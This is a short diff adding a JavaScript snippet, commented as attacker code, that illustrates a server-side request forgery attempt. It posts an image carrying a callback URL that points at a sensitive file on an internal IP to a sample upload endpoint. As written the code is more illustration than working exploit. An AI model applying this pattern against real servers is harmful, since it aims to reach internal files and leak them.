@@ -1,0 +1,12 @@
+// Attacker creates an image file with malicious callback URL
+var image = new Image();
+image.callbackUrl = "http://192.168.1.100/sensitive_file.txt";
+
+// Attacker sends the image file to the server
+var options = {
+  method: 'POST',
+  url: 'http://example.com/upload',
+  headers: {'content-type': 'multipart/form-data'},
+  formData: {image: image}
+};
+request(options);
